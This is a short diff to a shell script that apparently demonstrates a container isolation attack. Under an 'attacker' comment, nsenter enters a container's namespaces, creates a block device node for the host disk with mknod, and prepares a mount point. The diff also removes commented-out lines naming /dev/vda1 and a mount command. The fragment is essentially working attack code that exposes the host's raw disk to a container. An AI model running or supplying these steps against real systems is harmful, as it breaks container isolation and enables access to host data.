@@ -11,9 +11,7 @@ container_pid=$(cat PID)
 major=$(cat major_num)
 minor=$(cat minor_num)
 dev=$(cat sdev_of_fs)
-#dev="/dev/vda1"
+
 #Done by attacker inside host
-#: <<'END'
 nsenter --target ${container_pid} --mount --pid mknod --mode 0600 ${dev} b ${major} ${minor}
 nsenter --target ${container_pid} --mount --pid mkdir -p /tmpmount
-#nsenter --target ${container_pid} --mount --pid -- mount /dev/vda1 /tmpmount
